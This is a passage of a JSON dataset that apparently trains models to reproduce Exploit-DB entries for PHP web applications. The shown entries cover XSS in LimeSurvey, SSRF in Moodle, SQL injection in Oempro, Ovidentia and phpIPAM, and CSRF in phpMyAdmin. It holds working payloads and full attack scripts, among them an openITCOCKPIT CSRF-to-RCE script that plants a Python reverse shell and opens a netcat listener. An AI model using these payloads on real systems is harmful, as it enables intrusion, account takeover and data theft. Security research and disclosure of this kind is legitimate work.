                "CVE-2019-16173;CVE-2019-16172"
            ],
            "Tags": [
                "Cross-Site Scripting (XSS)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "http://www.exploit-db.comLimeSurvey-3.17.13-190824.tar.gz",
            "Source URL": "",
            "Exploit": "SEC Consult Vulnerability Lab Security Advisory < 20190912-0 >\n=======================================================================\n              title: Stored and reflected XSS vulnerabilities\n            product: LimeSurvey\n vulnerable version: <= 3.17.13\n      fixed version: =>3.17.14\n         CVE number: CVE-2019-16172, CVE-2019-16173\n             impact: medium\n           homepage: https://www.limesurvey.org/\n              found: 2019-08-23\n                 by: Andreas Kolbeck (Office Munich)\n                     David Haintz (Office Vienna)\n                     SEC Consult Vulnerability Lab\n\n                     An integrated part of SEC Consult\n                     Europe | Asia | North America\n\n                     https://www.sec-consult.com\n\n=======================================================================\n\nVendor description:\n-------------------\n\"LimeSurvey is the tool to use for your online surveys. Whether you are\nconducting simple questionnaires with just a couple of questions or advanced\nassessments with conditionals and quota management, LimeSurvey has got you\ncovered. LimeSurvey is 100% open source and will always be transparently developed.\nWe can help you reach your goals.\"\n\nSource: https://www.limesurvey.org/\n\n\nBusiness recommendation:\n------------------------\nLimeSurvey suffered from a vulnerability due to improper input\nand output validation. By exploiting this vulnerability an attacker could:\n    1. Attack other users of the web application with JavaScript code,\n       browser exploits or Trojan horses, or\n    2. perform unauthorized actions in the name of another logged-in user.\n\nThe vendor provides a patch which should be installed immediately.\nFurthermore, a thorough security analysis is highly recommended as only a\nshort spot check has been performed and additional issues are to be expected.\n\n\nVulnerability overview/description:\n-----------------------------------\n1) Stored and reflected XSS vulnerabilities\nLimeSurvey suffers from a stored and reflected cross-site scripting vulnerability,\nwhich allows an attacker to execute JavaScript code with the permissions of the victim.\nIn this way it is possible to escalate privileges from a low-privileged account e.g.\nto \"SuperAdmin\".\n\n\nProof of concept:\n-----------------\n1) Stored and reflected XSS vulnerabilities\nExample 1 - Stored XSS (CVE-2019-16172):\nThe attacker needs the appropriate permissions in order to create new survey groups.\nThen create a survey group with a JavaScript payload in the title, for example:\n\ntest<svg/onload=alert(document.cookie)>\n\nWhen the survey group is being deleted, e.g. by an administrative user, the JavaScript\ncode will be executed as part of the \"success\" message.\n\n\nExample 2 - Reflected XSS (CVE-2019-16173):\nThe following proof of concept prints the current CSRF token cookie which contains the\nCSRF token. The parameter \"surveyid\" is not filtered properly:\n\nhttp://$host/index.php/admin/survey?mandatory=1&sid=xxx&surveyid=xxx%22%3E%3Cimg%20\nsrc=x%20onerror=%22alert(document.cookie)%22%3E&sa=listquestions&sort=question\n\n\nIf the URL schema is configured differently the following payload works:\nhttp://$host/index.php?r=admin/survey&mandatory=1&sid=xxx&surveyid=\nxxx\"><img%20src=x%20onerror=\"alert(document.cookie)\">&sa=listquestions&sort=question\n\n\nVulnerable / tested versions:\n-----------------------------\nThe vulnerabilities have been verified to exist in version 3.17.9 and the latest\nversion 3.17.13. It is assumed that older versions are affected as well.\n\n\nVendor contact timeline:\n------------------------\n2019-08-29: Contacting vendor through https://bugs.limesurvey.org/view.php?id=15204\n2019-09-02: Fixes available:\n            https://github.com/LimeSurvey/LimeSurvey/commit/32d6a5224327b246ee3a2a08500544e4f80f9a9a\n            https://github.com/LimeSurvey/LimeSurvey/commit/f1c1ad2d24eb262363511fcca2e96ce737064006\n2019-09-02: Release of LimeSurvey v3.17.14 which fixes the security issues\n2019-09-03: Release of LimeSurvey v3.17.15 bug fix\n2019-09-12: Coordinated release of security advisory\n\n\nSolution:\n---------\nUpdate to version 3.17.15 or higher:\nhttps://www.limesurvey.org/stable-release\n\nThe vendor provides a detailed list of changes here:\nhttps://www.limesurvey.org/limesurvey-updates/2188-limesurvey-3-17-14-build-190902-released\n\n\nWorkaround:\n-----------\nNo workaround available.\n\n\nAdvisory URL:\n-------------\nhttps://www.sec-consult.com/en/vulnerability-lab/advisories/index.html\n\n\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nSEC Consult Vulnerability Lab\n\nSEC Consult\nEurope | Asia | North America\n\nAbout SEC Consult Vulnerability Lab\nThe SEC Consult Vulnerability Lab is an integrated part of SEC Consult. It\nensures the continued knowledge gain of SEC Consult in the field of network\nand application security to stay ahead of the attacker. The SEC Consult\nVulnerability Lab supports high-quality penetration testing and the evaluation\nof new offensive and defensive technologies for our customers. Hence our\ncustomers obtain the most current information about vulnerabilities and valid\nrecommendation about the risk profile of new technologies.\n\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\nInterested to work with the experts of SEC Consult?\nSend us your application https://www.sec-consult.com/en/career/index.html\n\nInterested in improving your cyber security with the experts of SEC Consult?\nContact our local offices https://www.sec-consult.com/en/contact/index.html\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nMail: research at sec-consult dot com\nWeb: https://www.sec-consult.com\nBlog: http://blog.sec-consult.com\nTwitter: https://twitter.com/sec_consult\n\nEOF A. Kolbeck / @2019"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47177",
        "output": {
            "ID": "47177",
            "File": "exploits/php/webapps/47177.txt",
            "Description": "Moodle Filepicker 3.5.2 - Server Side Request Forgery",
            "Date Published": "2019-07-26",
            "Author": "Fabian Mosch_ Nick Theisinger",
            "Type": "webapps",
            "Platform": "php",
            "Port": "80",
            "Date Added": "2019-07-26",
            "Date Updated": "2019-07-26",
            "Verified": "0",
            "Codes": [
                "CVE-2018-1042"
            ],
            "Tags": [
                "Server-Side Request Forgery (SSRF)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "http://www.exploit-db.commoodle-3.5.2.tar.gz",
            "Source URL": "",
            "Exploit": "# Exploit Title: Server Side Request Forgery in Moodle Filepicker\n# Google Dork: /\n# Date: 2019-07-25\n# Exploit Author: Fabian Mosch & Nick Theisinger (r-tec IT Security GmbH)\n# Vendor Homepage: https://moodle.org/\n# Software Link: https://github.com/moodle/moodle\n# Version: Moodle Versions 3.4, 3.3, 3.3.3, 3.2 to 3.2.6, 3.1 to 3.1.9 and 3.5.2\n# Tested on: Moodle Version 3.5.2\n# CVE : CVE-2018-1042\n\nWe found a SSRF vulnerability for Moodle version 3.5.2. An authenticated attacker can scan the internal network and exploit internal web services with blind injections. Probably we are dealing with CVE-2018-1042 mentioned here:\nhttps://moodle.org/mod/forum/discuss.php?d=364381\n\nIn version 3.5.2 we were not able to view all internal web server content, only pictures (PNG, GIF, SVN and so on) were displayed as a JSON-list. But it is possible to do internal port scans via http:// and https:// protocols. Open ports with no response for HTTP requests resulted in a timeout, SSL services like OpenSSH gave an SSL Error. For web applications the HTTP headers can be found in the response (403 forbidden, 404 not Found and so on). Found web applications can be attacked via HTTP GET requests. The vulnerable script is \"repository_ajax.php\" and the parameter is \"file\".\n\nExample exploitation request:\n\nPOST /repository/repository_ajax.php?action=signin HTTP/1.1\nHost: VulnerableMoodleHost\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: */*\nAccept-Language: de,en-US;q=0.7,en;q=0.3\nAccept-Encoding: gzip, deflate\nReferer: https://VulnerableMoodleHost/user/files.php\nX-Requested-With: XMLHttpRequest\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nContent-Length: 165\nConnection: close\nCookie: MoodleSession=xxxxx;\n\nfile=InternalURL?parameter=XXEInjection&repo_id=5&p=&page=&env=filemanager&sesskey=xxxxxxxxxx"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47967",
        "output": {
            "ID": "47967",
            "File": "exploits/php/webapps/47967.txt",
            "Description": "Octeth Oempro 4.8 - 'CampaignID' SQL Injection",
            "Date Published": "2020-01-28",
            "Author": "Bruno de Barros Bulle",
            "Type": "webapps",
            "Platform": "php",
            "Port": "80",
            "Date Added": "2020-01-28",
            "Date Updated": "2020-01-28",
            "Verified": "0",
            "Codes": [
                "CVE-2019-19740"
            ],
            "Tags": [
                "SQL Injection (SQLi)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: Octeth Oempro 4.8 - 'CampaignID' SQL Injection\n# Date: 2020-01-27\n# Exploit Author: Bruno de Barros Bulle (www.xlabs.com.br)\n# Vendor Homepage: www2.octeth.com\n# Version: Octeth Oempro v.4.7 and v.4.8\n# Tested on: Oempro v.4.7\n# CVE : CVE-2019-19740\n\n\nAn authenticated user can easily exploit this vulnerability. Octeth Oempro\n4.7 and 4.8 allow SQL injection. The parameter CampaignID in Campaign.Get\nis vulnerable.\n\n# Error condition\nPOST /api.php HTTP/1.1\nHost: 127.0.0.1\n\ncommand=Campaign.Get&CampaignID=2019'&responseformat=JSON\n\n# SQL Injection exploitation\nPOST /api.php HTTP/1.1\nHost: 127.0.0.1\n\ncommand=Campaign.Get&CampaignID=2019 OR '1=1&responseformat=JSON"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47366",
        "output": {
            "ID": "47366",
            "File": "exploits/php/webapps/47366.txt",
            "Description": "Online Appointment - SQL Injection",
            "Date Published": "2019-09-09",
            "Author": "mohammad zaheri",
            "Type": "webapps",
            "Platform": "php",
            "Port": "80",
            "Date Added": "2019-09-09",
            "Date Updated": "2019-09-10",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                "SQL Injection (SQLi)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: Online Appointment SQL Injection \n# Data: 07.09.2019\n# Exploit Author: mohammad zaheri\n# Vendor HomagePage: https://github.com/girish03/Online-Appointment-Booking-System\n# Tested on: Windows\n# Google Dork: N/A\n\n\n=========\nVulnerable Page:\n=========\nOnline-Appointment-Booking-System-master/signup.php\n\n\n==========\nVulnerable Source:\n==========\nLine 52: $name=$_POST['fname'];\nLine 53: $gender=$_POST['gender'];\nLine 54: $dob=$_POST['dob']; \nLine 55: $contact=$_POST['contact'];\nLine 56: $email=$_POST['email'];\nLine 57: $username=$_POST['username'];\nLine 58: $password=$_POST['pwd'];\nLine 59: $prepeat=$_POST['pwdr'];\nLine 62: if (mysqli_query($conn, $sql)) \n\n=========\nPOC:\n=========\nhttp://site.com/Online-Appointment-Booking-System-master/signup.php?sql=[SQL]\n\n\n\n=========\nContact Me :\n=========\nTelegram : @m_zhrii\nEmail : neoboy503@gmail.com"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47725",
        "output": {
            "ID": "47725",
            "File": "exploits/php/webapps/47725.txt",
            "Description": "Online Inventory Manager 3.2 - Persistent Cross-Site Scripting",
            "Date Published": "2019-11-29",
            "Author": "Cemal Cihad \u00c7\u0130FT\u00c7\u0130",
            "Type": "webapps",
            "Platform": "php",
            "Port": "",
            "Date Added": "2019-11-29",
            "Date Updated": "2019-11-29",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                "Cross-Site Scripting (XSS)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "http://www.exploit-db.comonline-inventory-manager-3.2.zip",
            "Source URL": "",
            "Exploit": "# Exploit Title: Online Inventory Manager 3.2 - Persistent Cross-Site Scripting\n# Date: 2019-11-29\n# Exploit Author: Cemal Cihad \u00c7\u0130FT\u00c7\u0130\n# Vendor Homepage: https://bigprof.com\n# Software Link : https://bigprof.com/appgini/applications/online-inventory-manager\n# Software : Online Inventory Manager\n# Version : 3.2\n# Vulernability Type : Cross-site Scripting\n# Vulenrability : Stored XSS\n# Tested on: Windows 10 Pro\n\n# Stored XSS has been discovered in the Online Inventory Manager created by bigprof/AppGini\n# editgroups section. In editgroups section\n# (http://localhost/inventory/admin/pageEditGroup.php?groupID=1).\n\n# Payload i used:\n\"><h1><IFRAME SRC=# onmouseover=\"alert(document.cookie)\"></IFRAME>123</h1>\"\n\n# POC: http://localhost/inventory/admin/pageViewGroups.php in this\n# url you can edit the groups information with pressing onto the group name. After the edit page open\n# you can enter your payload into the description field. After going back to\n# the groups page you will see your Javascript code gonna run.\n# This vulnerability is also exist while you are creating a new group."
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47737",
        "output": {
            "ID": "47737",
            "File": "exploits/php/webapps/47737.txt",
            "Description": "Online Invoicing System 2.6 - 'description' Persistent Cross-Site Scripting",
            "Date Published": "2019-12-03",
            "Author": "Cemal Cihad \u00c7\u0130FT\u00c7\u0130",
            "Type": "webapps",
            "Platform": "php",
            "Port": "",
            "Date Added": "2019-12-03",
            "Date Updated": "2019-12-03",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                "Cross-Site Scripting (XSS)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "http://www.exploit-db.comonline-invoicing-system-2.6.tar.gz",
            "Source URL": "",
            "Exploit": "# Exploit Title: Online Invoicing System 2.6 - 'description' Persistent Cross-Site Scripting\n# Date: 2019-11-29\n# Exploit Author: Cemal Cihad \u00c7\u0130FT\u00c7\u0130\n# Vendor Homepage: https://bigprof.com\n# Software Download Link : https://github.com/bigprof-software/online-invoicing-system\n# Software : Online Invoicing System\n# Version : 2.6\n# Vulernability Type : Cross-site Scripting\n# Vulenrability : Stored XSS\n\n# Stored XSS has been discovered in the Online Invoicing System created by bigprof/AppGini\n# editmembers section. Description parameter affected from this vulnerability.\n# payload: <script>alert(123);</script>\n\n# HTTP POST request\nPOST /inovicing/app/admin/pageEditGroup.php HTTP/1.1\nHost: 10.10.10.160\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 464\nOrigin: http://10.10.10.160\nConnection: close\nReferer: http://10.10.10.160/inovicing/app/admin/pageEditGroup.php?groupID=2\nCookie: inventory=4eg101l42apiuvutr7vguma5ar; online_inovicing_system=vl8ml5or8sgdee9ep9lnhglk69\nUpgrade-Insecure-Requests: 1\n\ngroupID=2&name=Admins&description=%3Cscript%3Ealert%28123%29%3B%3C%2Fscript%3E&visitorSignup=0&invoices_insert=1&invoices_view=3&invoices_edit=3&invoices_delete=3&clients_insert=1&clients_view=3&clients_edit=3&clients_delete=3&item_prices_insert=1&item_prices_view=3&item_prices_edit=3&item_prices_delete=3&invoice_items_insert=1&invoice_items_view=3&invoice_items_edit=3&invoice_items_delete=3&items_insert=1&items_view=3&items_edit=3&items_delete=3&saveChanges=1"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47305",
        "output": {
            "ID": "47305",
            "File": "exploits/php/webapps/47305.py",
            "Description": "openITCOCKPIT 3.6.1-2 - Cross-Site Request Forgery",
            "Date Published": "2019-08-26",
            "Author": "Julian Rittweger",
            "Type": "webapps",
            "Platform": "php",
            "Port": "80",
            "Date Added": "2019-08-26",
            "Date Updated": "2019-08-26",
            "Verified": "0",
            "Codes": [
                "CVE-2019-10227"
            ],
            "Tags": [
                "Cross-Site Request Forgery (CSRF)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "http://www.exploit-db.comopenITCOCKPIT-openITCOCKPIT-3.6.1-2.tar.gz",
            "Source URL": "",
            "Exploit": "# Exploit Title: openITCOCKPIT 3.6.1-2 - CSRF 2 RCE\n# Google Dork: N/A\n# Date: 26-08-2019\n# Exploit Author: Julian Rittweger\n# Vendor Homepage: https://openitcockpit.io/\n# Software Link: https://github.com/it-novum/openITCOCKPIT/releases/tag/openITCOCKPIT-3.6.1-2\n# Fixed in: 3.7.1 | https://github.com/it-novum/openITCOCKPIT/releases\n# Version: 3.6.1-2\n# Tested on: Debian 9\n# CVE : 2019-10227\n# Exploit Requirements: pip3 install bs4 requests && apt install netcat\n\n#!/usr/bin/env python\nimport requests, urllib3, os\nimport http.server, socketserver\n\nfrom bs4 import BeautifulSoup as bs\nurllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n\nprint(\"\"\"\n--                                                                                        \n  openITCOCKPIT v.3.6.1-2\n  [CSRF 2 RCE]\n--\n\"\"\")\n\n# Setup values\nRHOST = input('[x] Enter IP of remote machine: ')\nLHOST = input('[x] Enter IP of local  machine: ')\nRPORT = int(input('[x] Enter local port (back-connection): '))\nLPORT = int(input('[x] Enter local port (payload-hosting): '))\n\nprint('[-] Generating CSRF form using the following credentials: \"hacked@oicp.app - letmein1337\" ..')\n\n# Generate file which serves CSRF payload\npl = open('./index.html', 'w')\n# Register HTTP server\nhandler = http.server.SimpleHTTPRequestHandler\n\ncsrf = \"\"\"\n<iframe style=\"display:none;\" name=\"csrff\"></iframe>\n<form method=\"post\" action=\"https://\"\"\" + RHOST + \"\"\"/users/add\" target=\"csrff\" style=\"display:none;\">\n\t<input type=\"text\" name=\"_method\" value=\"POST\">\n\t<input type=\"text\" name=\"data[User][Container][]\" value=\"1\">\n\t<input type=\"text\" name=\"data[ContainerUserMembership][1]\" value=\"2\">\n\t<input type=\"text\" name=\"data[User][usergroup_id]\" value=\"1\">\n\t<input type=\"text\" name=\"data[User][status]\" value=\"1\">\n\t<input type=\"text\" name=\"data[User][email]\" value=\"hacked@oicp.app\">\n\t<input type=\"text\" name=\"data[User][firstname]\" value=\"Mr\">\n\t<input type=\"text\" name=\"data[User][lastname]\" value=\"Nice\">\n\t<input type=\"text\" name=\"data[User][new_password]\" value=\"letmein1337\">\n\t<input type=\"text\" name=\"data[User][confirm_new_password]\" value=\"letmein1337\">\n\t<input type=\"submit\">\n</form>\n<script>\n\tfunction Redirect() {  \n        window.location=\"https://\"\"\" + RHOST + \"\"\"/login/logout\"; \n    } \n\n\tdocument.forms[0].submit();\n    setTimeout('Redirect()', 3000);   \n</script>\n\"\"\"\n\npl.write(csrf)\npl.close()\nhttpd = socketserver.TCPServer((\"\", LPORT), handler)\n\n# Start HTTP server, quit on keyboard interrupt\ntry:\n\tprint('[!] Serving payload at port : ' + str(LPORT) + ', press STRG+C if you registered requests!')\n\tprint('[!] Send this URL to a logged-in administrator: http://' + LHOST + ':' + str(LPORT))\n\thttpd.serve_forever()\nexcept KeyboardInterrupt:\n\thttpd.socket.close()\n\tprint('\\n[-] Starting exploitation ..')\n\nprint('[-] Logging in ..')\n# Proceed login with generated credentials\nc = requests.post('https://' + RHOST + '/login/login', data={'_method' : 'POST', 'data[LoginUser][username]' : 'hacked@oicp.app', 'data[LoginUser][password]' : 'letmein1337'}, verify=False, allow_redirects=False).headers['Set-Cookie']\nprint('[!] Received cookie: ' + c.split(';')[0])\nprint('[-] Creating reverse-shell as macro ..')\n# Insert a new macro identified as $USER99$ \nmakro = {'_method' : 'POST', 'data[0][Macro][id]' : 1, 'data[0][Macro][name]' : '$USER1$', 'data[0][Macro][value]' : '/opt/openitc/nagios/libexec', 'data[0][Macro][description]' : 'default', 'data[0][Macro][password]' : 0, 'data[1][Macro][id]' : 2, 'data[1][Macro][name]' : '$USER99$', 'data[1][Macro][value]' : \"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"\" + LHOST + \"\\\",\" + str(RPORT) + \"));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);'\", 'data[1][Macro][password]' : 1}\nrequests.post('https://' + RHOST + '/macros', data=makro, verify=False, cookies={'itnovum' : c.split(';')[0].split('=')[1]})\nprint('[-] Inserting macro as command ..')\n# Register a new command using the inserted macro\nrequests.post('https://' + RHOST + '/commands/add/_controller:commands/_action:hostchecks', data={'_method' : 'POST', 'data[Command][command_type]' : 2, 'data[Command][name]' : 'pwned', 'data[Command][command_line]' : '$USER99$'}, verify=False, cookies={'itnovum' : c.split(';')[0].split('=')[1]})\nh = bs(requests.get('https://' + RHOST + '/commands/hostchecks', verify=False, cookies={'itnovum' : c.split(';')[0].split('=')[1]}).text, 'html.parser')\nids = []\n\n# Fetch current commands by ID\nfor i in h.find_all('form', {'action': lambda x : x.startswith('/commands/delete')}):\n\tids.append(i.get('action').split('/')[-1])\n\nprint('[!] ID of command identified as: ' + str(ids[-1]))\nprint('[-] Updating default host ..')\n\n# Update host, using the new malicious \"hostcheck\" command\nsett = {'_method':'POST','data[Host][id]':'1','data[Host][container_id]':'1','data[Host][shared_container]':'','data[Host][hosttemplate_id]':'1','data[Host][name]':'localhost','data[Host][description]':'default+host','data[Host][address]':'127.0.0.1','data[Host][Hostgroup]':'','data[Host][Parenthost]':'','data[Host][notes]':'','data[Host][host_url]':'','data[Host][priority]':'1','data[Host][tags]':'','data[Host][notify_period_id]':'1','data[Host][notification_interval]':'0','data[Host][notification_interval]':'0','data[Host][notify_on_recovery]':'0','data[Host][notify_on_recovery]':'1','data[Host][notify_on_down]':'0','data[Host][notify_on_unreachable]':'0','data[Host][notify_on_unreachable]':'1','data[Host][notify_on_flapping]':'0','data[Host][notify_on_downtime]':'0','data[Host][active_checks_enabled]':'0','data[Host][active_checks_enabled]':'1','data[Host][Contact]':'','data[Host][Contact][]':'1','data[Host][Contactgroup]':'','data[Host][command_id]':ids[-1],'data[Host][check_period_id]':'1','data[Host][max_check_attempts]':'3','data[Host][check_interval]':'120','data[Host][check_interval]':'120','data[Host][retry_interval]':'120','data[Host][retry_interval]':'120','data[Host][flap_detection_enabled]':'0','data[Host][flap_detection_on_up]':'0','data[Host][flap_detection_on_down]':'0', 'data[Host][flap_detection_on_unreachable]' : 0}\nrequests.post('https://' + RHOST + '/hosts/edit/1/_controller:hosts/_action:browser/_id:1/', data=sett, verify=False, cookies={'itnovum' : c.split(';')[0].split('=')[1]})\n\n# Refresh host configuration\nprint('[-] Refreshing host configuration ..')\nrequests.get('https://' + RHOST + '/exports/launchExport/0.json', verify=False, cookies={'itnovum' : c.split(';')[0].split('=')[1]}, headers={'X-Requested-With' : 'XMLHttpRequest'})\n\nprint('[!] Done! Enjoy your shell (popup in approx. 30s): ')\n\n# We did it!\nos.system('nc -lvp ' + str(RPORT))"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47160",
        "output": {
            "ID": "47160",
            "File": "exploits/php/webapps/47160.txt",
            "Description": "Ovidentia 8.4.3 - SQL Injection",
            "Date Published": "2019-07-25",
            "Author": "UserX",
            "Type": "webapps",
            "Platform": "php",
            "Port": "80",
            "Date Added": "2019-07-25",
            "Date Updated": "2019-07-26",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                "SQL Injection (SQLi)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "#-------------------------------------------------------\n# Exploit Title: [ Ovidentia CMS - SQL Injection (Authenticated) ]\n# Date: [ 06/05/2019 ]\n# CVE: [ CVE-2019-13978 ]\n# Exploit Author:\n# [ Fernando Pinheiro (n3k00n3) ]\n# [ Victor Flores (UserX) ]\n# Vendor Homepage: [\nhttps://www.ovidentia.org/\n]\n# Version: [ 8.4.3 ]\n# Tested on: [ Mac,linux - Firefox, safari ]\n# Download [\nhttp://en.ovidentia.org/index.php?tg=fileman&sAction=getFile&id=17&gr=Y&path=Downloads%2FDistributions&file=ovidentia-8-4-3.zip&idf=893\n]\n#\n#           [ Kitsun3Sec Research Group ]\n#--------------------------------------------------------\n\nPOC\n\nPath: /ovidentia/index.php?tg=delegat&idx=mem&id=1\nType: GET\nVulnerable Field: id\nPayload:\n\t\t1. tg=delegat&idx=mem&id=1 AND 3152=(SELECT (CASE WHEN (3152=3152) THEN 3152 ELSE (SELECT 9962 UNION SELECT\n\t\t2. tg=delegat&idx=mem&id=1 AND (SELECT * FROM (SELECT(SLEEP(5)))QwTg)\n\nURL:\nhttps://target/ovidentia/index.php?tg=delegat&idx=mem&id=1\nUsing Request file\nsqlmap.py -r req --random-agent --risk 3 --level 5 --dbms=mysql -p id --dbs\n\nUsing Get\n./sqlmap.py -u\n[http://target/ovidentia/index.php\\?tg\\=delegat\\&idx\\=mem\\&id\\=1](http://target/ovidentia/index.php/?tg\\=delegat\\&idx\\=mem\\&id\\=1)\n--cookie \"Cookie: OV1364928461=6kb5jvu7f6lg93qlo3vl9111f8\" --random-agent --risk 3 --level 5 --dbms=mysql -p id --dbs"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47438",
        "output": {
            "ID": "47438",
            "File": "exploits/php/webapps/47438.py",
            "Description": "phpIPAM 1.4 - SQL Injection",
            "Date Published": "2019-09-30",
            "Author": "Kevin Kirsche",
            "Type": "webapps",
            "Platform": "php",
            "Port": "80",
            "Date Added": "2019-09-30",
            "Date Updated": "2019-09-30",
            "Verified": "0",
            "Codes": [
                "CVE-2019-16692"
            ],
            "Tags": [
                "SQL Injection (SQLi)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "http://www.exploit-db.comphpipam-1.4.tar.gz",
            "Source URL": "",
            "Exploit": "#!/usr/bin/env python3\n# Exploit Title: phpIPAM Custom Field Filter SQL Injection\n# Exploit Announcement Date: September 16, 2019 5:18 AM\n# Exploit Creation Date: September 27, 2019\n# Exploit Author: Kevin Kirsche\n# Vendor Homepage: https://phpipam.net\n# Software Link: https://github.com/phpipam/phpipam/archive/1.4.tar.gz\n# Version: 1.4\n# Tested on: Ubuntu 18.04 / MariaDB 10.4\n# Requires:\n#   Python 3\n#   requests package\n# CVE: CVE-2019-16692\n\n# For more details, view:\n# https://github.com/phpipam/phpipam/issues/2738\n# https://github.com/kkirsche/CVE-2019-16692\n\n# Example Output\n# [+] Executing select user()\n# [*] Received: phpipam@172.18.0.4\n# [+] Executing select system_user()\n# [*] Received: phpipam@172.18.0.4\n# [+] Executing select @@version\n# [*] Received: .4.8-MariaDB-1:10.4.8+maria~b\n# [+] Executing select @@datadir\n# [*] Received: /var/lib/mysq\n# [+] Executing select @@hostname\n# [*] Received: ubuntu\n\n\nfrom requests import Session\n\nhost = \"localhost\"\nlogin_url = f\"http://{host}/app/login/login_check.php\"\nexploit_url = f\"http://{host}/app/admin/custom-fields/filter-result.php\"\n\ncredentials = {\n    \"ipamusername\": \"Admin\",\n    \"ipampassword\": \"Password\",\n}\n\npayload = {\n    \"action\": \"add\",\n    \"table\": \"\",\n}\n\n\ncmds = {\n    \"unpriv\": [\n        \"select user()\",\n        \"select system_user()\",\n        \"select @@version\",\n        \"select @@datadir\",\n        \"select @@hostname\",\n    ]\n}\n\nif __name__ == \"__main__\":\n    client = Session()\n    resp = client.post(login_url, data=credentials)\n    if resp.status_code == 200:\n        for cmd in cmds[\"unpriv\"]:\n            print(f\"[+] Executing {cmd}\")\n            payload[\"table\"] = f\"users`where 1=(updatexml(1,concat(0x3a,({cmd})),1))#`\"\n            resp = client.post(exploit_url, data=payload)\n            info = resp.text.lstrip(\"<div class='alert alert-danger'>SQLSTATE[HY000]: General error: 1105 XPATH syntax error: ':\").rstrip(\"'</div><div class='alert alert-success'>Filter saved</div>\")\n            print(f\"[*] Received: {info}\")"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47385",
        "output": {
            "ID": "47385",
            "File": "exploits/php/webapps/47385.txt",
            "Description": "phpMyAdmin 4.9.0.1 - Cross-Site Request Forgery",
            "Date Published": "2019-09-13",
            "Author": "Manuel Garc\u00eda C\u00e1rdenas",
            "Type": "webapps",
            "Platform": "php",
            "Port": "80",
            "Date Added": "2019-09-13",
            "Date Updated": "2019-09-13",
            "Verified": "0",
            "Codes": [
                "CVE-2019-12922"
            ],
            "Tags": [
                "Cross-Site Request Forgery (CSRF)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "http://www.exploit-db.comphpMyAdmin-4.9.0.1-all-languages.zip",
            "Source URL": "",
            "Exploit": "=============================================\nMGC ALERT 2019-003\n- Original release date: June 13, 2019\n- Last revised:  September 13, 2019\n- Discovered by: Manuel Garcia Cardenas\n- Severity: 4,3/10 (CVSS Base Score)\n- CVE-ID: CVE-2019-12922\n=============================================\n\nI. VULNERABILITY\n-------------------------\nphpMyAdmin 4.9.0.1 - Cross-Site Request Forgery\n\nII. BACKGROUND\n-------------------------\nphpMyAdmin is a free software tool written in PHP, intended to handle the\nadministration of MySQL over the Web. phpMyAdmin supports a wide range of\noperations on MySQL and MariaDB.\n\nIII. DESCRIPTION\n-------------------------\nHas been detected a Cross-Site Request Forgery in phpMyAdmin, that allows\nan attacker to trigger a CSRF attack against a phpMyAdmin user deleting any\nserver in the Setup page.\n\nIV. PROOF OF CONCEPT\n-------------------------\nExploit CSRF - Deleting main server\n\n<p>Deleting Server 1</p>\n<img src=\"\nhttp://server/phpmyadmin/setup/index.php?page=servers&mode=remove&id=1\"\nstyle=\"display:none;\" />\n\nV. BUSINESS IMPACT\n-------------------------\nThe attacker can easily create a fake hyperlink containing the request that\nwants to execute on behalf the user,in this way making possible a CSRF\nattack due to the wrong use of HTTP method.\n\nVI. SYSTEMS AFFECTED\n-------------------------\nphpMyAdmin <= 4.9.0.1\n\nVII. 